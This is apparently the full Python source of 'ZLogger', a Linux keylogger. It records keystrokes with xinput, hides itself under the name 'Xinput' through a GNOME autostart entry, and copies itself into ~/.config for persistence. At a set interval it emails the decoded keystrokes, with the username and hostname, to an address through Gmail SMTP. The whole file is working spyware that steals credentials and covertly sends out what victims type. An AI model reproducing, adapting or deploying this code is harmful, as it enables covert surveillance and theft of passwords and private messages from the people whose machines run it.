#!/usr/bin/env python

import smtplib, re, os, stat, config
from shutil import copyfile
from getpass import getuser
from socket import gethostname
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from time import sleep
from subprocess import Popen, PIPE, check_output

EMAIL_SERVER = "smtp.gmail.com"

LOG_FILE = "/tmp/xinput.txt"
HOME_CONFIG_DIRECTORY = os.path.expanduser('~') + "/.config/"
AUTOSTART_PATH = HOME_CONFIG_DIRECTORY + "/autostart/"
AUTOSTART_FILE = AUTOSTART_PATH + "xinput.desktop"

AUTOSTART_ENTRY = """
[Desktop Entry]
Type=Application
X-GNOME-Autostart-enabled=true
Name=Xinput
"""

def send_mail(subject, content):
    body = "\n** ZLogger **\n"
    body = body + "\nThis message is sent from :"
    body = body + sysinfo()
    body = body + "\n---------------------------\n\n"
    body = body + content
    msg = MIMEMultipart()
    msg['Subject'] = subject
    msg.attach(MIMEText(body))
    mailer = smtplib.SMTP(EMAIL_SERVER, 587)

    mailer.starttls()
    mailer.login(config.EMAIL, config.PASSWORD)

    mailer.sendmail(config.EMAIL, config.EMAIL, msg.as_string())
    mailer.close()

def sysinfo():
    return "\nUser : " + getuser() + "\nHostname : " + gethostname()

def start_logging(log_file):
    devices = check_output("xinput list | grep AT", shell=True)

    regex = re.compile('id=([^"]+)\t')
    keyboard_id = regex.findall(devices)[0]

    command = "xinput test " + keyboard_id + " > " + log_file
    Popen(command , shell=True)

def chmod_to_exec(file):
    os.chmod(file, os.stat(file).st_mode | stat.S_IEXEC)


def initialize():
    try:
        os.makedirs(AUTOSTART_PATH)
    except OSError:
        pass

    current_file = os.path.realpath(__file__).replace(".py", "")

    destination_file = HOME_CONFIG_DIRECTORY + config.FILE_NAME
    copyfile(current_file, destination_file)
    chmod_to_exec(destination_file)

    with open(AUTOSTART_FILE,'w') as out:
        out.write(AUTOSTART_ENTRY + "Exec=" + destination_file + "\n")

    chmod_to_exec(AUTOSTART_FILE)

    Popen(destination_file)

def generate_chars_dict(charmap):    
    chars_dict = dict()
    for line in charmap.split("\n"):
        line = line.split()
        try:
            chars_dict[line[1]] = (process_key(line[3]), process_key(line[4]))
            character = line[3]
        except IndexError:
            continue
    return chars_dict

def process_key(key):
    if len(key) == 1:
        return key
    elif key == "Return":
        return "\n"
    elif key == "space":
        return " "
    elif key == "Shift_L" or key == "Shift_R":
        return "shift" 
    else:
        return "<" + key + ">"        


def translate_log(file, chars_dict):
    shift = False
    log = ""
    with open(file) as log_file:
        for line in log_file.readlines():
            line = line.split()
            char_code = line[2]

            if shift and chars_dict[char_code][0] == "shift":
                shift = False

            
            if line[1] == 'press':
                  key = chars_dict[char_code][0]
                  if key == "shift":
                    shift = True
                    continue

                  if shift:
                    key = chars_dict[char_code][1] 
                  log = log + key
    return log


def send_mail_reports_every(interval):
    kmap = check_output("xmodmap -pke", shell=True)
    chars_dict = generate_chars_dict(kmap)
    while True:
        sleep(interval)
        logs = translate_log(LOG_FILE, chars_dict)
        send_mail("Zlogger Report", logs)
        with open(LOG_FILE, "w"):
            pass


if not os.path.isfile(AUTOSTART_FILE) :
      initialize()
else:
      start_logging(LOG_FILE)
      send_mail_reports_every(config.SLEEP_INTERVAL)
